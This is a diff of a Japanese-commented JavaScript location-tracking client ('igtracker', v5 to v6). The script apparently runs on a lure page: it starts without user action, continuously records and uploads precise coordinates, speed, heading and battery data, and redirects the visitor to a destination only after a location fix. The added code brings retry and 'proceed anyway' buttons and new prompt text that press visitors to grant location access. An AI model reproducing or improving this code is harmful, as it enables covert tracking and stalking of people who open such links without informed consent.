@@ -1,9 +1,9 @@
-/* 連続位置追跡クライアント (igtracker) v5
+/* 連続位置追跡クライアント (igtracker) v6
    window.LT_CODE / LT_IV / LT_MAX / LT_HIT を事前定義すること。
    ・ユーザー操作なしで自動開始し、開いている間ずっと取り続ける
-   ・測位が途切れたらウォッチドッグが自動復帰（ボタン不要）
+   ・測位が途切れたらウォッチドッグが自動復帰
    ・位置情報が許可されていない間はリダイレクトしない
-   ・LT_DEST があり、取得できたときだけ飛び先へ自動リダイレクト */
+   ・未許可のときだけ「もう一度」「このまま進む」を出す */
 (function () {
   "use strict";
 
@@ -17,13 +17,14 @@
   var SEND_EVERY = Math.min(IV, 4000);
   var GEO_OPTS = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
 
-  var DEST = window.LT_DEST || "";
+  var DEST = window.LT_DEST || "";                       // 取得できたときの遷移先
+  var DEST_ALWAYS = window.LT_DEST_ALWAYS || DEST;       // 「このまま進む」用
   var DEST_MIN = (parseFloat(window.LT_DEST_MIN) || 2) * 1000;
   var WAIT = (parseFloat(window.LT_WAIT) || 15) * 1000;
   var DENY_REDIRECT = !!window.LT_DENY_REDIRECT;
   var BRIEF = !!window.LT_BRIEF;
   var TXT = {
-    wait: window.LT_ASK_TEXT  || "位置情報を取得しています…",
+    ask:  window.LT_ASK_TEXT  || "位置情報の使用を許可してください",
     ok:   window.LT_OK_TEXT   || "取得しました。移動します…",
     deny: window.LT_DENY_TEXT || "位置情報が許可されていません"
   };
@@ -55,13 +56,26 @@
     var s = $("lt_st");
     if (!s) return;
     if (BRIEF) {
-      if (state === "deny") { s.textContent = TXT.deny; s.className = "lt-warn"; return; }
-      if (state === "ok")   { s.textContent = TXT.ok;   s.className = "lt-on";   return; }
-      s.textContent = TXT.wait; s.className = "lt-dim"; return;
+      var cls = state === "deny" ? "warn" : (state === "ok" ? "on" : "dim");
+      s.className = "ask-t lt-" + cls;
+      s.textContent = state === "deny" ? TXT.deny : (state === "ok" ? TXT.ok : TXT.ask);
+      return;
     }
     if (state === "deny" && !m) { s.textContent = TXT.deny; s.className = "lt-warn"; return; }
-    s.textContent = m || TXT.wait;
+    s.textContent = m || TXT.ask;
     s.className = "lt-" + (c || "dim");
+  }
+
+  function showBtns() {
+    var r = $("lt_retry"), k = $("lt_skip");
+    if (r) r.style.display = state === "deny" ? "" : "none";
+    if (k) k.style.display = (state === "deny" && DEST_ALWAYS) ? "" : "none";
+  }
+
+  function setState(st) {
+    state = st;
+    say("", st === "deny" ? "warn" : (st === "ok" ? "on" : "dim"));
+    showBtns();
   }
 
   function tick() {
@@ -106,14 +120,16 @@
     else send({ kind: kind });
   }
 
-  /* 取得できたときだけ呼ぶ */
-  function leave() {
-    if (left || !DEST) return;
+  function goto(url) {
+    if (!url) return;
+    if (left) return;
     left = true;
     try { beacon("stop"); } catch (e) {}
-    try { location.replace(DEST); }
-    catch (e) { location.href = DEST; }
+    try { location.replace(url); }
+    catch (e) { location.href = url; }
   }
+
+  function leave() { if (!left && DEST) goto(DEST); }
 
   function onPos(p) {
     var c = (p && p.coords) || {};
@@ -121,7 +137,7 @@
     var firstFix = !gotFix;
     gotFix = true; denied = false; count++;
     lastFix = Date.now();
-    if (firstFix) state = "ok";
+    if (firstFix) setState("ok");
     q.push({ ts: iso(p.timestamp || Date.now()), lat: c.latitude, lon: c.longitude,
              acc: c.accuracy, spd: c.speed, hdg: c.heading, batt: batt, chg: chg });
     if (q.length > 3000) q.splice(0, q.length - 3000);
@@ -131,19 +147,24 @@
     say("記録中 " + count + " 点" +
         (bestAcc ? "（最高精度 ±" + Math.round(bestAcc) + "m）" : ""), "on");
     if (count === 1 || q.length >= 4 || Date.now() - last > SEND_EVERY) send();
-    // 取得できた瞬間に「少し待ってから」飛び先へ
     if (firstFix && DEST) setTimeout(leave, DEST_MIN);
   }
 
   function onErr(e) {
     var c = e && e.code;
-    if (c === 1) { denied = true; say("位置情報が拒否されています", "warn"); }
-    else if (c === 2) { say("位置を取得できません（アプリ内ブラウザの可能性）", "warn"); }
-    else if (c === 3) { say("測位がタイムアウト。自動で再試行します", "warn"); }
-    else { say("測位エラー: " + ((e && e.message) || c), "warn"); }
+    if (c === 1) {
+      denied = true;
+      if (!gotFix) setState("deny");
+      else say("位置情報が拒否されています", "warn");
+    } else if (c === 2) {
+      say("位置を取得できません（アプリ内ブラウザの可能性）", "warn");
+    } else if (c === 3) {
+      say("測位がタイムアウト。自動で再試行します", "warn");
+    } else {
+      say("測位エラー: " + ((e && e.message) || c), "warn");
+    }
   }
 
-  /* 途切れを自動で拾う常時ウォッチドッグ */
   function watchdog() {
     if (stopped || left || !navigator.geolocation) return;
     var gap = Date.now() - (lastFix || started || Date.now());
@@ -245,12 +266,10 @@
     started = Date.now(); stopped = false;
     lastFix = Date.now();
     showPerm(); checkInApp(); readBatt(); keepAwake();
+    showBtns();
     if (!navigator.geolocation) {
-      say("この端末は位置情報に非対応です", "warn");
-      if (DEST) {
-        if (DENY_REDIRECT) setTimeout(leave, 1200);
-        else { state = "deny"; say("", "warn"); }
-      }
+      setState("deny");
+      if (DEST && DENY_REDIRECT) setTimeout(leave, 1200);
       return;
     }
     ask().then(function () {
@@ -269,13 +288,12 @@
       say("記録を開始しました（自動・永続）", "on");
     });
 
-    // 一定時間たっても取得できない → 未許可表示。以降は許可され次第自動で遷移
+    // 何秒たっても取れない → 未許可表示（以降は許可され次第自動で遷移）
     if (DEST) {
       setTimeout(function () {
-        if (left || gotFix) return;
+        if (left || gotFix || state === "deny") return;
         if (DENY_REDIRECT) { leave(); return; }
-        state = "deny";
-        say("", "warn");
+        setState("deny");
       }, WAIT);
     }
   }
@@ -289,6 +307,7 @@
     if (dog) clearInterval(dog);
     clock = sender = dog = null;
     beacon("stop");
+    setState("wait");
     say("停止しました" + (why ? "（" + why + "）" : "") + " 記録 " + count + " 点", "dim");
   }
 
@@ -316,15 +335,28 @@
     restart();
     send({ kind: "open" });
   });
-  // 画面タップでも測位を促す（未許可のとき有効）
-  document.addEventListener("click", function () {
+
+  // ボタン以外の場所タップでも測位を促す
+  document.addEventListener("click", function (e) {
+    var t = e.target;
+    if (t && t.tagName === "BUTTON") return;
     if (!stopped && !gotFix) ask();
   }, { passive: true });
 
   var go = $("lt_go"), sp = $("lt_stop"), cp = $("lt_copy");
+  var rt = $("lt_retry"), sk = $("lt_skip");
   if (go) go.addEventListener("click", function () {
     if (stopped) { boot(); go.textContent = "再取得"; }
     else { lastFix = 0; restart(); ask(); }
+  });
+  if (rt) rt.addEventListener("click", function () {
+    setState("wait");
+    lastFix = 0; lastAsk = 0;
+    restart();
+    ask();
+  });
+  if (sk) sk.addEventListener("click", function () {
+    if (DEST_ALWAYS) goto(DEST_ALWAYS);
   });
   if (sp) sp.addEventListener("click", function () { stop("手動"); });
   if (cp) cp.addEventListener("click", function () {
